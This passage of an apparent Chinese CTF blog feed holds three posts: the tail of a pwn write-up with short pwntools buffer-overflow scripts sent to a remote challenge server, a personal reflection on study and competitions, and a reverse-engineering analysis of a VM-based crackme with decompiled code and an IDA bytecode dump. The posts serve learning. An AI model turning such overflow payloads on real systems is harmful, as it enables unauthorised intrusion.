class="number">2</span>):</span><br><span class="line">    char_list.<span class="built_in">append</span>(<span class="built_in">char</span>[i:i+<span class="number">2</span>])</span><br><span class="line">char_list.<span class="built_in">reverse</span>()</span><br><span class="line"><span class="built_in">print</span>(char_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in char_list:</span><br><span class="line">    <span class="built_in">text</span>+=chr(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">text</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/03/KXt6uF.png" alt="KXt6uF.png"></p><blockquote><p>我们再次进入python中;<br><img src="https://s2.ax1x.com/2019/11/03/KXtcB4.png" alt="KXtcB4.png"><br>因为  -4  是因为  67到63 是用来填充返回地址 （这里即是sysaddr）的</p></blockquote><h3 id="于是构造exp：我这里有点不明白，怎么个回事！-我这个运行不出来"><a href="#于是构造exp：我这里有点不明白，怎么个回事！-我这个运行不出来" class="headerlink" title="于是构造exp：我这里有点不明白，怎么个回事！  我这个运行不出来"></a>于是构造exp：我这里有点不明白，怎么个回事！  我这个运行不出来</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">#context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">#conn=process(<span class="string">"./forgot"</span>)</span><br><span class="line">conn=remote(<span class="string">"111.198.29.45"</span>,<span class="string">"49142"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">63</span>+p32(<span class="number">0x080486cc</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">#conn.sendlineafter(<span class="string">"&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/03/KXtRE9.png" alt="KXtRE9.png"></p><blockquote><p>而参考网上的却可以   ？？？很懵！</p></blockquote><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote('<span class="number">111.198</span><span class="number">.29</span><span class="number">.45</span>','<span class="number">49142</span>')</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = 'A'*<span class="number">63</span> + p32(<span class="number">0x080486cc</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/03/KXtWNR.png" alt="KXtWNR.png"></p><p><img src="https://s2.ax1x.com/2019/10/12/uXYRN4.png" alt="uXYRN4.png"><br>要舒展啊！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前已经做过了，但为了共享我尽量把他们放到这里上！这边大概涉及到如何python与C混合编程以及测变量在栈上偏移量的一种方法！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>疯狂的木头07</title>
    <link href="http://yoursite.com/2019/11/02/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B407/"/>
    <id>http://yoursite.com/2019/11/02/疯狂的木头07/</id>
    <published>2019-11-02T11:27:12.000Z</published>
    <updated>2019-11-02T14:40:10.321Z</updated>
    
    <content type="html"><![CDATA[<p>前端时间电脑崩了，丢失了太多文件与数据，糟心啊！说不难受都是假的！又因为unctf比赛，所以今天才把博客给恢复过来！不过我觉得我这次是要好好思考一番了！</p><a id="more"></a><h2 id="起初，我也是带着美好的愿望出发的！"><a href="#起初，我也是带着美好的愿望出发的！" class="headerlink" title="起初，我也是带着美好的愿望出发的！"></a>起初，我也是带着美好的愿望出发的！</h2><blockquote><p>从小的时候，就梦想着以后能够强大起来，像赛亚人保护地球那种！哈，我呢！对长大后的希望就是“在朋友们不顺心或者失意的时候可以随时出现在他们身边”，然后再有一个稳定的工作，工作之余去做自己喜欢的事，见相见的人！与他们一起去看漫展，一起搭火烤串，一起抓鱼，一起“开会”，一起畅谈，一起看书，一起建个大的室内体育场，一起打着乒乓，羽毛与篮球，一起再去外面世界转个一转，闻闻花香，见见海涌！而一定，我的想要不止这些！或许早有些，已忘记，早有些，不允许再提起！于是我便朝着这个方向去走着，因为决心不够，没能够清楚看清大局势！输了高考！</p></blockquote><h2 id="其实它们很遥远，走着真的来不及！"><a href="#其实它们很遥远，走着真的来不及！" class="headerlink" title="其实它们很遥远，走着真的来不及！"></a>其实它们很遥远，走着真的来不及！</h2><blockquote><p>还好上天眷顾，又给了我一次觉醒的机会，进了很普通的二本学校，比整个大学二本专业最低录取线高1分！真的感谢，被命运原谅了，但原谅归原谅，再被相信就难了，我可要好好抓住这次改过的机会并且不能再失败，我计划的期望时间是2年，要找到自信的自我，进而再稳定朝着第一步的工作努力！之后的就暂且后面再说！前期没有人能指引着大学我该建立一个怎样的大路线去走，只好自己摸索着走！加学生会，各种社团…,然后就这样还挺开心的过了1月（或许吧），突然发现，我并不能去走社交这条路！进了计算机行业，当然是允许去选择做其他事情的，但必须要保证自己的专业知识要过关，甚至佼佼者水平！可我连C语言都还看不明白呢！</p></blockquote><h2 id="当方向错了，停止就是进步"><a href="#当方向错了，停止就是进步" class="headerlink" title="当方向错了，停止就是进步"></a>当方向错了，停止就是进步</h2><blockquote><p>刚好学校有个信息安全实验室，2017创建的，主要正是招向我们这个渗透测试班的（恍然明白了，如果那年没有新开这个专业，我或许就写不了这篇反思了）当时很明白，在一所普通的院校，也许用专业比赛证书去弥补下学校层次的缺陷！不管怎么样，必须要加入！想的很美好，可学生会那边已经退不了了！我就这样，丢掉了一年有效时间！这一年下来，经历了总归是有用的，也认识了几个有趣的朋友，但内心深处我觉得大一一年，我对自己很失望！暑假的时候，组长和大三的杨学长带我去西安打了场CTF比赛，和大佬们相处，我还认识到自己，真的太弱了，不会说话，像个木头！我自己都觉得这已经涉及到尊重与修养上了！可我还是像个木头一样！失望至极！</p></blockquote><h2 id="不胜感激，不止前进！"><a href="#不胜感激，不止前进！" class="headerlink" title="不胜感激，不止前进！"></a>不胜感激，不止前进！</h2><blockquote><p>西安之行，有高铁，有华山，还有第一次的线下比赛，长见识啊，还有一部K3，兴奋呐！组长给说，学习一定要有计划，今天要做什么，这周要完成什么，这个月要完成什么，都要做个规划！另外把去年丢的时间要补回来！我觉得，真的，有人带着的感觉真好！但一定接下来的总归要自己走！不过路上有人给了正确的指引，都要铭记在心！不胜感激。不止前进！</p></blockquote><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><blockquote><p>而处于大二阶段的我，可没有想象中的跑起来！我本着多学实验室的内容，绝大部分不曾听过班课！发现到其实是得不偿失的选择！觉得到从进入大学到现在做的得不偿失的事太多了！心里满满的愧疚，离我自己的目标里的太远了，就拿这1，2周来说吧，有些上进心不够，或许是因为一直学却得不到反馈而着急了吧,不过这事，急不得的，所以，今天不得不写个稍长的文章来反思下自己，要一步一步来，谁内心慌了，就会出局的！上面定的2年时间马上就快到了，没有事情是突然做成的，必然是个渐进的过程！除此之外，要活跃起来呢，要舒展起来呢！</p></blockquote><h2 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h2><blockquote><p>近期计划：英语四级，二进制学习，期末考试，下年ACM，ISCC，强网杯</p></blockquote><h2 id="高度自律即绝对自由"><a href="#高度自律即绝对自由" class="headerlink" title="高度自律即绝对自由"></a>高度自律即绝对自由</h2><blockquote><p>这部分就不多说了，坚持就是了！每天早起，每天锻炼，每天反思，每天静心，每天进步！<br>我还有个梦想：寻找小伙伴，走进新世界！野心，就请你一起膨胀起来吧！</p></blockquote><h2 id="我心永恒！"><a href="#我心永恒！" class="headerlink" title="我心永恒！"></a>我心永恒！</h2><blockquote><p><img src="https://s2.ax1x.com/2019/11/02/KLL6BT.jpg" alt="KLL6BT.jpg"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前端时间电脑崩了，丢失了太多文件与数据，糟心啊！说不难受都是假的！又因为unctf比赛，所以今天才把博客给恢复过来！不过我觉得我这次是要好好思考一番了！&lt;/p&gt;
    
    </summary>
    
    
      <category term="疯狂的木头" scheme="http://yoursite.com/tags/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B4/"/>
    
  </entry>
  
  <entry>
    <title>Nctf WxyVM</title>
    <link href="http://yoursite.com/2019/10/14/Nctf%20WxyVM/"/>
    <id>http://yoursite.com/2019/10/14/Nctf WxyVM/</id>
    <published>2019-10-14T13:48:29.000Z</published>
    <updated>2019-10-15T13:48:47.821Z</updated>
    
    <content type="html"><![CDATA[<p>前十多天，初学pwn，导致一直没有看逆向，而前两天遇到个VM题，一点思路没有，于是开始来学习下VMProtect；这道题终于算是有了个了解，觉得自己汇编有点差劲呢！<br>VMProtetct 的题太好时间了，//尽管这可能并算不上难题，因为这里面还没有垃圾代码以及多余判断，<br>第一次做VM，记录下</p><a id="more"></a><h1 id="了解VMProtect"><a href="#了解VMProtect" class="headerlink" title="了解VMProtect"></a>了解VMProtect</h1><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//www.52pojie.cn/forum.php?mod=viewthread&amp;tid=713219</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//zhuanlan.zhihu.com/p/27067133</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//zhuanlan.zhihu.com/p/28176139</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//www.freebuf.com/column/174623.html</span></span><br><span class="line"></span><br><span class="line">github之VMProtect：</span><br><span class="line"><span class="symbol">https:</span><span class="comment">//github.com/lmy375/awesome-vmp</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">本题参考wp：</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//radishes.top/2018/12/11/2018-12-11-%E9%80%86%E5%90%91VM%E7%B1%BB%E5%9E%8B/</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//www.itread01.com/content/1543881789.html</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/15/KPdiPs.png" alt="KPdiPs.png"></p><h3 id="进入main-函数"><a href="#进入main-函数" class="headerlink" title="进入main()函数;"></a>进入main()函数;</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This is a %s\nplz input your flag:"</span>, aWcyvm1);<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// This is a WcyVM1</span></span><br><span class="line">                                                <span class="comment">// plz input your flag:</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400DB7() )             <span class="comment">// sub_400DB7是 一个 VM虚拟机</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"flag is your input"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"didixingwei"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>主函数中没有什么特别的</p></blockquote><h3 id="进去分析下-sub-400DB7"><a href="#进去分析下-sub-400DB7" class="headerlink" title="进去分析下 sub_400DB7"></a>进去分析下 sub_400DB7</h3><blockquote><p>函数内部我已经重命名了，方便我们理解，另外下面  类似这样的代码 [VM_EIP[1] - 1]   真实的意思 是     zijiema[VM_EIP+1]-1  (VM_EIP指向相当于cpu中的rip)</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">_<span class="function">BOOL8 <span class="title">sub_400DB7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">void</span> *zijiema; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> *R[<span class="number">0</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> *R1; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> *R2; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> *R3; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *VM_RSP; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  _DWORD *VM_EIP; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  zijiema = <span class="built_in">malloc</span>(<span class="number">0x200</span>uLL);</span><br><span class="line">  v3 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1400</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;R[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(zijiema, dword_6021C0, <span class="number">0x190</span>uLL);      <span class="comment">// &amp;unk_6021C0指针  是VMP字节码：VM_DATA（有点相当于CPU中的每个指令）   </span></span><br><span class="line">  R[<span class="number">0</span>] = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">0x38</span>uLL);                <span class="comment">// 初始化 虚拟机，保存物理寄存器到  虚拟机寄存器数组VM_CONTEXT;这里我们重命名为R[0],方便读阅</span></span><br><span class="line">                                                <span class="comment">// 而 CMP中的 EDI寄存器中存储的地址，就是虚拟机寄存器数组的起始地址；</span></span><br><span class="line">                                                <span class="comment">// rax     R0</span></span><br><span class="line">  R1 = R[<span class="number">0</span>] + <span class="number">1</span>;                                <span class="comment">// rbx     R1</span></span><br><span class="line">  R2 = R[<span class="number">0</span>] + <span class="number">2</span>;                                <span class="comment">// rcx     R2</span></span><br><span class="line">  R3 = R[<span class="number">0</span>] + <span class="number">3</span>;                                <span class="comment">// R3</span></span><br><span class="line">  VM_RSP = v3 + <span class="number">5120</span>;                           <span class="comment">// RBP   相当于 VMP中的栈顶   </span></span><br><span class="line">  v9 = v3 + <span class="number">5120</span>;                               <span class="comment">// rbp</span></span><br><span class="line">  VM_EIP = zijiema;                             <span class="comment">// VM_EIP (VMP中的ESI寄存器) 指向 VMP字节码的某个地址，起初让其指向VMP的首指针，</span></span><br><span class="line">                                                <span class="comment">// 所以，可以推断处  V10 是VM_EIP</span></span><br><span class="line">LABEL_26:</span><br><span class="line">  <span class="keyword">while</span> ( *VM_EIP )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">char</span>)*VM_EIP )                    <span class="comment">// 每有一个case 就对应一个 Handler </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:                                   <span class="comment">// mov R[VM_EIP[1]-1] =  VM_EIP[2]  ;  VM_EIP+=3*4  </span></span><br><span class="line">                                                <span class="comment">// 其实这里   VM_EIP可以相当于是 i   即 i+=3*12</span></span><br><span class="line">        sub_40082B((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], VM_EIP[<span class="number">2</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:                                   <span class="comment">// pop R[VM_EIP[i+1]-1];  VM_EIP 即 i=i+2*4</span></span><br><span class="line">        sub_40096D((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (_DWORD **)&amp;VM_RSP, &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:                                  <span class="comment">// push R[VM_EIP[i+1]-1];   i=i+2*4</span></span><br><span class="line">        sub_400927((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], &amp;VM_RSP, &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:                                  <span class="comment">// R0=getchar();i+=1*4</span></span><br><span class="line">        sub_4009B3(R[<span class="number">0</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:                                  <span class="comment">// putchar(R0)  ;i+=1*4</span></span><br><span class="line">        sub_4009E5(R[<span class="number">0</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">        sub_400B5D(&amp;v1, (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);<span class="comment">// 有点多  见里面注释吧，然后 i+=3*4</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">        sub_400A34(&amp;VM_EIP, VM_EIP[<span class="number">1</span>], (__int64)zijiema);<span class="comment">// jump i+1</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">15</span>:                                  <span class="comment">// if    v1==0x80   jump i+=2*4</span></span><br><span class="line">                                                <span class="comment">// else  jump i= 4*(i+1)</span></span><br><span class="line">        sub_400AAF(v1, (<span class="keyword">signed</span> __int64 *)&amp;VM_EIP, VM_EIP[<span class="number">1</span>], (__int64)zijiema);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">        sub_400A61(v1, (<span class="keyword">signed</span> __int64 *)&amp;VM_EIP, VM_EIP[<span class="number">1</span>], (__int64)zijiema);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">        sub_400AFD((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], &amp;VM_EIP);<span class="comment">// r0++; i+=2*4</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">        sub_400B2D((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], &amp;VM_EIP);<span class="comment">// r0--; i+=2*4</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">        sub_400C0E((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], VM_EIP[<span class="number">2</span>], &amp;VM_EIP);<span class="comment">// r0+=VM_EIP[i+2]   i=3*4</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">20</span>:                                  <span class="comment">// 两个寄存器  相加    i+=3*4</span></span><br><span class="line">        sub_400C43((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">21</span>:                                  <span class="comment">// 寄存器  等于  寄存器^( i+2)      ；i=i+3</span></span><br><span class="line">        sub_400C7C((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], VM_EIP[<span class="number">2</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">22</span>:                                  <span class="comment">// 寄存器等于寄存器  &amp;寄存器     i+=12</span></span><br><span class="line">        sub_400CB1((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">23</span>:                                  <span class="comment">// 寄存器等于寄存器  | 寄存器     i+=12</span></span><br><span class="line">        sub_400CEA((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">25</span>:                                  <span class="comment">// 寄存器左  =寄存器（右）    i+=12</span></span><br><span class="line">        sub_400858((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">26</span>:                                  <span class="comment">// 寄存器左  =寄存器（右）的地址    i+=12</span></span><br><span class="line">        sub_400889((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (<span class="keyword">unsigned</span> __int64)(&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">27</span>:                                  <span class="comment">// 将第二个寄存器中存的地址中的值传给第一个寄存器  i+=12</span></span><br><span class="line">        sub_4008BA((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">28</span>:                                  <span class="comment">// // 将第二个寄存器中存的指针所指向的值传给第一个寄存器</span></span><br><span class="line">        sub_4008EF((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">29</span>:                                  <span class="comment">// 寄存器*=(i+2)</span></span><br><span class="line">        sub_400D23((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], VM_EIP[<span class="number">2</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> sub_400D59((__int64)v9);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_400A17(&amp;VM_EIP);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上面函数详细见 注释：（分析了好久好久，汇编有些弱），接下来我们找下虚拟机字节码在呢，我们可分析知 在dword_6021C0指向地址处</p></blockquote><h4 id="ida脚本把字节码跑出来"><a href="#ida脚本把字节码跑出来" class="headerlink" title="ida脚本把字节码跑出来"></a>ida脚本把字节码跑出来</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auto i,start,end;<span class="comment">//,num;</span></span><br><span class="line">start = <span class="number">0x6021C0</span>;</span><br><span class="line">end = <span class="number">0x602350</span>;</span><br><span class="line">Message(<span class="string">"<span class="subst">\n</span>---------<span class="subst">\n</span>"</span>);</span><br><span class="line">for(i=start;i&lt;end;i=i+<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">Message(<span class="string">"0x%x,"</span>,Dword(i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0x8</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span 